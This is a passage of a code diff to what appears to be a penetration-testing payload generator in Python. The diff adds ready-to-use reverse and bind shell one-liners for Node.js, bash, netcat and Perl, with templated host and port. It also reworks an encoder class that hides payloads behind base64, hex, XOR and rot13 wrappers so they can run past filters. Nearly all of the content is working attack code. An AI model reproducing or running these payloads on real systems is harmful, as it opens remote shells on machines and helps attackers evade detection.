                 # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
             },
-            "nodejs": {
+            "nodejs-linux": {
+                "nodejs-async": """echo 'require("child_process").exec("{shell_path} -i >& /dev/tcp/{host}/{port} 0>&1")'|{binary_name}""",
+                "nodejs-sync": """echo 'require("child_process").execSync("{shell_path} -i >& /dev/tcp/{host}/{port} 0>&1")'|{binary_name}""",
+                "nodejs-spawn": """echo '!function(){{var e=require("net"),n=require("child_process"),r=n.spawn("{shell_path}",[]),t=new e.Socket;return t.connect({port},"{host}",function(){{t.pipe(r.stdin),r.stdout.pipe(t),r.stderr.pipe(t)}}),/a/}}();'|{binary_name}""",
+            },
+            "nodejs-windows": {
                 "nodejs-async": "echo require('child_process').exec('nc -e {shell_path} {host} {port}')|{binary_name}",
                 "nodejs-sync": "echo require('child_process').execSync('nc -e {shell_path} {host} {port}')|{binary_name}",
                 "nodejs-spawn": '''echo !function(){{var e=require("net"),n=require("child_process"),r=n.spawn("{shell_path}",[]),t=new e.Socket;return t.connect({port},"{host}",function(){{t.pipe(r.stdin),r.stdout.pipe(t),r.stderr.pipe(t)}}),/a/}}();|{binary_name}''',
@@ -252,7 +288,11 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             },
         },
         "bind": {
+            "bash": {
+                "bash-bind": "rm -f /tmp/m;mkfifo /tmp/m;cat /tmp/m|{shell_path} -i 2>&1|nc -l {port} >/tmp/m",
+            },
             "netcat": {
+                "nc": "rm -f /tmp/m;mkfifo /tmp/m;cat /tmp/m|{shell_path} -i 2>&1|nc -l {port} >/tmp/m",
                 "nc-e": "{binary_name} -Lnp {port} -e {shell_path}{nc_args}",
                 "ncat-e": "ncat -lnp {port} -e {shell_path}{ncat_args}",
                 "ncat-ssl": "ncat -lnp {port} -e {shell_path} --ssl",
@@ -265,6 +305,12 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             "python": {
                 "python-bind": '''{binary_name} -c "import subprocess as u;c=__import__('socket').socket();c.bind(('{host}',{port}));c.listen(0);cc,a=c.accept();p=u.Popen(['{shell_path}'],stdin=u.PIPE,stdout=u.PIPE,stderr=u.STDOUT);r=__import__('threading').Thread(target=lambda:[cc.send(p.stdout.read(1024)) for _ in iter(int,1)],);r.start();[p.stdin.flush() for _ in iter(int, 1) if p.stdin.write(cc.recv(1024))]"''',
                 "pwncat": "pwncat -l {host} {port} -e {shell_path}{pwncat_args}",
+            },
+            "perl-linux": {
+                "perl-bind": """{binary_name} -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("{protocol}"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{shell_path} -i");}};'""",
+            },
+            "perl-windows": {
+                'perl-bind': '''{binary_name} -e "use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('{protocol}'));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,'>&C');open(STDOUT,'>&C');open(STDERR,'>&C');exec('{shell_path}');}};"''',
             },
             # gotty args
             # --url [value] Specify string for the URL
@@ -281,41 +327,99 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
 
     payloads_dict = {}
     nc_args = ncat_args = pwncat_args = socat_args = gotty_args = ""
-    if "windows" in platform:
-        socat_args = ",pipes"
-
     try:
         protocol = protocol.lower()
         if protocol not in ["tcp", "udp", "https"]:
             protocol = "tcp"
 
         if shell_type == "bash":
-            shell_type = "bash-password" if password != "" else "bash"
+            platform = "[linux, mac, bsd, solaris]"
+            if password != "":
+                shell_type = "bash-password"
             if protocol == "https" or encryption == "ssl":
                 shell_type = "bash-ssl-password" if password != "" else "bash-ssl"
                 protocol = "https"
             elif protocol not in ["tcp", "udp"]:
                 protocol = "tcp"
 
+        elif shell_type in ["powershell", "csharp"]:
+            platform = "windows"
+
         elif shell_type == "netcat":
+            if protocol == "udp":
+                nc_args = ncat_args = pwncat_args = " -u"
+
             if protocol == "https" or encryption == "ssl":
+                ncat_args = " --ssl"
                 shell_type = "netcat-ssl"
                 protocol = "https"
-            elif protocol == "udp":
-                nc_args = ncat_args = pwncat_args = " -u"
+                if "windows" in platform:
+                    if password != "":
+                        shell_type = "netcat-windows-password"
+                else:
+                    if password != "":
+                        shell_type = "netcat-ssl-password"
+            elif protocol in ["tcp", "udp"]:
+                print(1)
+                if "windows" in platform:
+                    shell_type = "netcat-windows"
+                    if password != "":
+                        shell_type = "netcat-windows-password"
+                else:
+                    if password != "":
+                        shell_type = "netcat-password"
             elif protocol not in ["tcp", "udp"]:
                 protocol = "tcp"
+
+        elif shell_type == "telnet":
+            platform = "[linux, mac, bsd, solaris]"
+            shell_type = "telnet-linux"
+
+        elif shell_type == "openssl":
+            platform = "[linux, mac, bsd, solaris]"
+            shell_type = "openssl-linux"
+
+        elif shell_type == "perl":
+            if protocol not in ["tcp", "udp"]:
+                protocol = "tcp"
+            shell_type = "perl-windows" if "windows" in platform else "perl-linux"
+
+        elif shell_type == "nodejs":
+            shell_type = "nodejs-windows" if "windows" in platform else "nodejs-linux"
+
+        elif shell_type == "python":
+            if "windows" in platform:
+                shell_type = "python-windows"
+
+        elif shell_type == "php":
+            if "windows" in platform:
+                shell_type = "php-windows"
+
+        elif shell_type == "ruby":
+            shell_type = "ruby-windows" if "windows" in platform else "ruby-linux"
 
         elif shell_type == "socat":
             if protocol not in ["tcp", "udp"]:
                 protocol = "tcp"
+            if "windows" in platform:
+                socat_args = ",pipes"
+
+        elif shell_type == "golang":
+            if protocol not in ["tcp", "udp"]:
+                protocol = "tcp"
+            if direction == "reverse":
+                shell_type = "golang-windows" if "windows" in platform else "golang-linux"
 
     except AttributeError:
         pass
 
-    # Mapping shell type to binary name
-    binary_names = {"netcat": "nc", "nodejs": "node", "golang": "go"}
     if not binary_name:
+        # Mapping shell type to binary name
+        binary_names = {"netcat": "nc", "nodejs": "node", "golang": "go", "perl-linux": "perl", "perl-windows": "perl",
+                        "golang-windows": "go", "golang-linux": "go", "ruby-linux": "ruby", "ruby-windows": "ruby",
+                        "telnet-linux": "telnet", "openssl-linux": "openssl", "nodejs-windows": "node",
+                        "nodejs-linux": "node", "python-windows": "python", "netcat-password": "nc",
+                        "netcat-windows": "nc", "netcat-windows-password": "ncat"}
         if shell_type in binary_names:
             for i, j in binary_names.items():
                 if shell_type == i:
@@ -339,7 +443,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
         for name, payload in payloads_dict.items():
             for i in encoder:
                 if i != "url":
-                    payload = PayloadEncoder(shell_type, platform, i, payload, shell_path)
+                    payload = Encoder(shell_type, platform, i, payload, shell_path)
                 payloads_dict[name] = payload
 
     # Staging payload
@@ -363,7 +467,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     if encoder and "url" in encoder:
         payloads_urlencoded_dict = {}
         for name, payload in payloads_dict.items():
-            url_payload = PayloadEncoder.url(payload)
+            url_payload = Encoder.url(payload)
             payloads_urlencoded_dict[name] = url_payload
         payloads_dict.update(payloads_urlencoded_dict)
 
@@ -639,10 +743,6 @@ class PayloadWrapper:
                             "Accept-Language": "*"
                         }}'''
 
-        # TEST
-        # if staging_url == 3:
-        #     return {"TEST": self.urlWrapper(staging_cmd, "http://test.com/test") + "|" + shell_path}
-        # TEST
         data_dict = staged_payload_dict = {}
         if staging_url in staging_apis.keys():
             import json
@@ -913,16 +1013,16 @@ class PayloadWrapper:
             return reply.decode()
 
 
-class PayloadEncoder(object):
+class Encoder(object):
     def __new__(cls, shell_type=None, platform=None, encoder=None, payload=None, shell_path=None):
-        self = super(PayloadEncoder, cls).__new__(cls)
+        self = super(Encoder, cls).__new__(cls)
         self.shell_type = shell_type
         self.platform = platform
         self.encode = encoder
         self.shell_path = shell_path
         self.payload = payload
         # Extract code
-        if "-c" in encoder:
+        if "-c" in encoder and any(x in self.shell_type for x in ["python", "powershell"]):
             codeRegex = __import__('re').compile(r"([\"'])(?:(?=(\\?))\2.)*?\1")
             if codeRegex.search(self.payload):
                 self.payload = codeRegex.search(self.payload).group()[1:-1]
@@ -945,7 +1045,7 @@ class PayloadEncoder(object):
     def base64(self):
         payload = self.payload
         if "-c" in self.encode:
-            if self.shell_type == "python":
+            if "python" in self.shell_type:
                 wrapper = '''python -c "exec(__import__('base64').b64decode('{payload}').decode())"'''
                 payload = wrapper.format(payload=__import__('base64').b64encode(payload.encode()).decode())
             elif self.shell_type == "powershell":
@@ -980,9 +1080,9 @@ class PayloadEncoder(object):
     def hex(self):
         payload = self.payload
         if "-c" in self.encode:
-            if self.shell_type == "python":
-                wrapper1 = "exec(bytearray.fromhex('{payload}').decode())"
-                wrapper2 = "exec(__import__('binascii').unhexlify(bytes('{payload}')).decode())"
+            if "python" in self.shell_type:
+                wrapper1 = '''python -c "exec(bytearray.fromhex('{payload}').decode())"'''
+                wrapper2 = '''python -c "exec(__import__('binascii').unhexlify(bytes('{payload}')).decode())"'''
                 wrapper = __import__('random').choice([wrapper1, wrapper2])
                 payload = wrapper.format(payload="".join("{:02x}".format(ord(c)) for c in payload))
             elif self.shell_type == "powershell":
@@ -1007,8 +1107,8 @@ class PayloadEncoder(object):
         import random
         payload = self.payload
         if "-c" in self.encode:
-            if self.shell_type == "python":
-                wrapper = '''exec(''.join([chr(ord(j)^ord('{key}')) for j in bytearray.fromhex('{payload}').decode()]))'''
+            if "python" in self.shell_type:
+                wrapper = '''python -c "exec(''.join([chr(ord(j)^ord('{key}')) for j in bytearray.fromhex('{payload}').decode()]))"'''
                 key = random.choice(__import__('string').ascii_letters + __import__('string').ascii_uppercase)
                 payload = "".join([chr(ord(j) ^ ord(key)) for j in payload])
                 payload = "".join("{:02x}".format(ord(c)) for c in payload)
@@ -1039,7 +1139,7 @@ class PayloadEncoder(object):
     def rot13(self):
         payload = self.payload
         if "-c" in self.encode:
-            if self.shell_type == "python":
+            if "python" in self.shell_type:
                 wrapper = '''python -c "exec(__import__('codecs').decode('{payload}','rot13'))"'''
                 d = {}
                 for c in (65, 97):
